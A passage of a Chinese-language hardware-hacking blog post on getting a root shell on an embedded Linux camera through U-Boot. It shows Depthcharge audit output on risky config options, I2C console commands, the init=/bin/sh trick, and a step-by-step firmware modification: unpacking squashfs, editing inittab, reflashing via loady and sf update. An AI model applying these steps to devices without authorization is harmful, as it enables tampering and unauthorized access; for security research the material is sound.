[*]   Excluded:  CpCrashMemoryReader - No data abort register target is defined for Generic 32-bit, little-endian
[*]   Available: CRC32MemoryReader
[*]   Excluded:  GoMemoryReader - Invalid or unsupported payload "RETURN_MEMORY_WORD" required.
[*]   Excluded:  I2CMemoryReader - Command "i2c" required but not detected.
[*]   Excluded:  ItestMemoryReader - Command "itest" required but not detected.
[*]   Available: MdMemoryReader
[*]   Available: MmMemoryReader
[...]
81000000: df ff ff 9f ff fd 76 ff ff bf f7 ff ff ff ff ff  ......v.........                                                                                                  
[...]
810001f0: df f5 7e dd ff ff fe d7 ff f7 ef ee f7 bf ff ff  ..~.............
```

如果你想在构建U-Boot之前审计配置， `depthcharge-audit-config` 是另一个可以实现此任务的脚本：

```
$ depthcharge-audit-config -u .config -o test.md -V 2023.04

------[ Disclaimer ]-----------------------------------------------------------
[...]

-------------------------------------------------------------------------------

12 potential security risks identified.
Results written to test.md

$ cat test.md

# CONFIG_CMD_CRC32: The crc32 console command can be abused to read and tamper with code and data in RAM

## Impact

**Memory read primitive:** Operation can be abused to read memory at an attacker-controlled address.

**Memory write primitive:** Operation can be abused to write memory at an attacker-controlled
address, potentially leading to execution of attacker-supplied code.

## Source

.config:532

## Description

The \`crc32\` U-Boot console command can be performed over arbitrary lengths. In lieu of
memory commands such as \`md\`, \`crc32\` can be used to read arbitrary memory contents
a few bytes at a time, in conjunction with a simple lookup table.

Furthermore, because this command allows the checksum to be written to an arbitrary
memory location, this command can be abused as an arbitrary write primitive that
allows an attacker with console access to patch running code. A description of
how this can be (ab)used in practice is presented in the Depthcharge documentation:

* <https://depthcharge.readthedocs.io/en/latest/api/depthcharge.hunter.html#depthcharge.hunter.ReverseCRC32Hunter>
* <https://depthcharge.readthedocs.io/en/latest/api/depthcharge.memory.html#depthcharge.memory.CRC32MemoryWriter>
* <https://depthcharge.readthedocs.io/en/latest/api/depthcharge.memory.html#depthcharge.memory.CRC32MemoryReader>

## Recommendation

Disable the \`crc32\` command via \`CONFIG_CMD_CRC32\`.

If platform requirements appear necessitate this command, re-evaluate the requirements to
determine if a cryptographic hash function represents a better alternative.
CRC32 is not resistant to malicious tampering. A cryptographic hash function (e.g.
SHA-2, SHA-3) is better suited if the checksum is relied upon for anything other than
detecting random failures.

If CRC32 absolutely must be used, patch the implementation to remove its ability to write
to arbitrary memory locations. Also, restrict the operation to multiples of fixed block
sizes (e.g. 1024) to mitigate its misuse as a read primitive.

# CONFIG_CMD_MEMORY: The memory family of console commands can be abused to read and tamper with RAM contents

## Impact

**Memory read primitive:** Operation can be abused to read memory at an attacker-controlled address.

**Memory write primitive:** Operation can be abused to write memory at an attacker-controlled
address, potentially leading to execution of attacker-supplied code.

## Source

.config:538

## Description

The CONFIG_CMD_MEMORY option enables a family of commands designed to provide
the operator with the ability to read from and write to arbitrary memory locations.
While this provides significant utility during engineering and development, their
inclusion in production builds can undermine security objectives.

The \`mm\`, \`nm\`, \`mw\`, \`cp\` command can be abused to arbitrarily read and modify memory.
Overwriting function pointers (e.g. command handlers) can execution to be redirected to
attacker-supplied code.

Note that \`mw\` and \`nm\` display current memory contents when prompting for a change,
allowing them to also be be used as memory read operations.

The \`cp\` command can be abused as an arbitrary read by triggering an exception on
platforms that do not support non-word-aligned accesses and then parsing crash dump
contents. Alternatively, targeted memory can be copied to an otherwise accessible
location (e.g. locations containing displayed string contents).

Although this command does not allow arbitrary data to be supplied directly, it still
serves as an arbitrary write primitive given that one can copy selected regions of
memory read by this command, with byte-level granularity.

The \`cmp\` command can be abused as an arbitrary read primitive using a binary search
and region containing attacker controlled values.

Refer to the Depthcharge memory access abstractions for example implementations.
    <https://depthcharge.readthedocs.io/en/latest/api/depthcharge.memory.html#depthcharge.memory.CpMemoryWriter>

## Recommendation

Disable memory operation commands by disabling CONFIG_CMD_MEMORY.

For most production firmware releases, addresses operated on (e.g. image loading
locations) should either be fixed or obtained from cryptographically authenticated data
(e.g. FIT images). Consider deviations from this guideline as potential red flags.

[...]
```

我们可以看到它对配置提出了建议，因此不要犹豫使用它来评估你的配置。还有额外有用的脚本可用，Python库非常有趣，特别是用于自动化利用步骤。

### 附加2：你提到了I2C？

集成电路互连（I2C）协议旨在允许多个芯片与一个或多个其他芯片（多主/多从）进行通信。它是一种同步串行接口，只需要两条信号线来交换信息：SDA用于串行数据线，SCL用于串行时钟线(8)。

总线上的节点有两种角色，要么是控制器（主设备），要么是目标（从设备）。控制器生成时钟并启动与目标的通信，而目标接收时钟并响应控制器。 总线是多控制器的，意味着它可以处理任意数量的控制器节点。在执行任何其他操作之前，我们必须选择总线并探测设备。

选择I2C总线

```
i2c dev <bus>
```

探测设备

```
i2c probe <chip>
```

之后，我们可以从设备读取或写入：

从设备读取

```
i2c read <chip> <chip address> <length> <memory address>
```

从设备读取并显示

```
i2c md <chip> <chip address> <length>
```

写入设备

```
i2c mw <chip> <chip address> <value> <length>
```

> 写入设备

```
i2c write <memaddress> <chip> <chip address> <length>
```

如果你想深入挖掘，I2C协议例如被用来解锁Sonos设备中的U-Boot shell(9)(10)。

我们尝试列出我们在工作过程中发现的所有命令和技巧。你现在应该理解了逻辑，并能够将其应用于破坏新设备！

## 绕过我，如果你可以

在深入研究保护措施和可能的绕过方法之前，你还记得之前提到的包含init=/linuxrc的bootargs环境变量吗？还记得我们在内核加载后没有得到一个shell吗？一个著名的黑客技巧是将这个变量的内容替换为init=/bin/sh。这取决于/bin/sh二进制文件的存在和其他参数，我们可以得到一个shell，这个shell可能功能有限，但足以深入挖掘设备的文件系统及其功能。

遗憾的是，这个技巧在我们分析的设备上不起作用。如果我们仔细观察我们所做的转储，会发现控制台节点没有被创建，因为该行被注释掉了：

```
$ cat init.d/rcS 

#!/bin/sh

# Set mdev
echo /sbin/mdev > /proc/sys/kernel/hotplug
/sbin/mdev -s && echo "mdev is ok......"

# create console and null node for nfsroot
#mknod -m 600 /dev/console c 5 1
#mknod -m 666 /dev/null c 1 3

[...]
```

此外，getty是在控制台上生成的：

```
$ cat etc/inittab | grep getty

# Put a getty on the serial port
console::respawn:/sbin/getty -L console 115200 vt100 # GENERIC_SERIAL
```

让我们尝试做一些修改。首先，我们需要确定地址：

```
$ binwalk serial.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
198328        0x306B8         CRC32 polynomial table, little endian
202676        0x317B4         LZO compressed data
206460        0x3267C         Android bootimg, kernel size: 0 bytes, kernel addr: 0x70657250, ramdisk size: 543519329 bytes, ramdisk addr: 0x6E72656B, product name: "mem boot start"
524288        0x80000         uImage header, header size: 64 bytes, header CRC: 0x345A4340, created: 2019-04-18 00:43:41, image size: 1503922 bytes, Data Address: 0x80010000, Entry Point: 0x803A6FB0, data CRC: 0xAB59224B, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux-3.10.14__isvp_turkey_1.0__"
524352        0x80040         LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes
2162688       0x210000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2616010 bytes, 444 inodes, blocksize: 131072 bytes, created: 2019-06-20 11:18:19
5046272       0x4D0000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 1451982 bytes, 29 inodes, blocksize: 131072 bytes, created: 2019-06-20 11:18:20
6619136       0x650000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 843702 bytes, 122 inodes, blocksize: 131072 bytes, created: 2019-06-20 11:18:20
[...]
```

根分区从0x210000开始，到0x4D0000结束（大小0x2C0000）。使用dd提取，然后使用unsquashfs解包（分区不能直接挂载和修改，因为squashfs分区是只读的）：

```
$ dd if=serial.bin of=root.bin bs=1 skip=2162688 count=2883584
2883584+0 records in
2883584+0 records out
2883584 bytes (2.9 MB, 2.8 MiB) copied, 1.88257 s, 1.5 MB/s

$ unsquashfs root.bin 
Parallel unsquashfs: Using 8 processors
403 inodes (451 blocks) to write

[===========================================================================================================================================================|] 451/451 100%
```

创建了82个文件 创建了41个目录 创建了321个符号链接 创建了0个设备 创建了0个FIFO 修改/etc/inittab文件，使我们的UART串行连接上有shell：console::respawn:/sbin/getty -L console 115200 vt100 # GENERIC\_SERIAL被替换为ttyS1::respawn:/sbin/getty -L ttyS1 115200 vt100 # GENERIC\_SERIAL。最后，使用mksquashfs重建squashfs分区，并在二进制文件的末尾添加一些0，以匹配原始大小：

```
$ mksquashfs squashfs-root/ packed_root.bin -comp xz
mksquashfs squashfs-root/ packed_root.bin -comp xz 
Parallel mksquashfs: Using 8 processors
Creating 4.0 filesystem on packed_root.bin, block size 131072.
[===========================================================================================================================================================/] 130/130 100%

Exportable Squashfs 4.0 filesystem, xz compressed, data block size 131072
 compressed data, compressed metadata, compressed fragments,
 compressed xattrs, compressed ids
 duplicates are removed
Filesystem size 2554.69 Kbytes (2.49 Mbytes)
 26.93% of uncompressed filesystem size (9487.46 Kbytes)
Inode table size 3090 bytes (3.02 Kbytes)
 18.59% of uncompressed inode table size (16618 bytes)
Directory table size 3890 bytes (3.80 Kbytes)
 49.09% of uncompressed directory table size (7925 bytes)
Number of duplicate files found 0
Number of inodes 444
Number of files 82
Number of fragments 24
Number of symbolic links  321
Number of device nodes 0
[...]

$ du -b root.bin
2883584 root.bin

$ df -h packed_root.bin
2617344 packed_root.bin

$ truncate -s truncate -s 2883584 packed_root.bin
```

然后，使用新的命令将二进制文件上传到我们的设备，使用U-Boot：loady。它用于等待一个二进制文件加载到一个地址，通过minicom使用YMODEM协议发送。首先，探测闪存，然后，使用loady将二进制文件加载到RAM：

```
#sf probe 
the manufacturer ef
SF: Detected W25Q64

--->probe send 4ms

# loady 0x80600000 115200
## Ready for binary (ymodem) download to 0x80600000 at 115200 bps...                                                          
C
```

在minicom TTY中，我们按CTRL+A S，然后选择YMODEM协议和相应的二进制文件。几分钟后，二进制文件被上传：

```
ymodem
 

CyzModem - CRC mode, 22530(SOH)/0(STX)/0(CAN) packets, 7 retries
## Total Size      = 0x002c0000 = 2883584 Bytes
```

最后，更新根文件系统。这一步非常关键，因为如果指定了错误的地址，内核或启动分区可能会被擦除，导致丢失U-Boot shell和设备变砖：

```
# sf update 0x80600000 0x210000 0x2C0000
0 bytes written, 2883584 bytes skipped in 0.516s, speed 5689383 B/s
--->update spend 522 ms
```

最后，得到shell：

```
# reset
[...]
Starting kernel ...
puwell login: root
[root@puwell:~]# ls
bin  etc  linuxrc  mnt  proc  root  sbin  tmp  usr  dev  lib  media  opt  puwell  run  sys  sys  user  var
```

此外，其他技巧也可能证明有用：

从镜像转储中，识别是否安装了BusyBox并检查安装了哪些二进制文件。BusyBox是一个软件套件，它在单个可执行文件中提供了几个Unix实用程序，专门为资源非常有限的嵌入式操作系统(11)而创建。回到我们之前的例子，我们知道linuxrc是在内核启动阶段开始的程序，在实际启动过程之前，所以我们在U-Boot中尝试了init的所有值（init=/linuxrc && /bin/busybox sh…）。 检查是否考虑了bootargs参数。如果它无效，设备在内核启动阶段自动重启。尝试在此参数内更改控制台（ttyS0, ttyS2…），或者如果有两台控制台值，就反转顺序。 尝试更改stderr、stdin和stdout（如果有另一个串行连接）：

```
# coninfo
列出可用设备：

serial   80000003 SIO stdin stdout stderr 
jz_serial 00000003 .IO
```

这些信息显示了串行接口的当前配置，可能有助于我们找到其他串行端口，这些端口可以用于获取一个shell。

除了上述技巧，还有一些其他的技巧可能会有所帮助：

1. **检查BusyBox** ：从镜像转储中，识别是否安装了BusyBox，并检查安装了哪些二进制文件。BusyBox是一个集成了多个Unix工具的软件套件，它专门为资源受限的嵌入式系统设计。例如，我们之前知道 `linuxrc` 是在内核启动阶段开始的程序，在实际启动过程之前，所以我们尝试了在U-Boot中为 `init` 指定不同的值（例如 `init=/linuxrc && /bin/busybox sh` ）。
2. **检查bootargs参数** ：如果 `bootargs` 参数无效，设备可能会在内核启动阶段自动重启。尝试更改该参数内的控制台（例如 `ttyS0`, `ttyS2` 等），或者如果有两个控制台值，尝试反转它们的顺序。
3. **更改标准输入输出** ：如果存在另一个串行连接，尝试更改 `stderr` 、 `stdin` 和 `stdout` 。

这些技巧可以帮助你在设备启动过程中获取一个shell，从而进一步探索设备的文件系统和功能。记住，不同的设备可能需要不同的方法，因此灵活性和创造性是关键。

发布于 2024-10-10 22:14・四川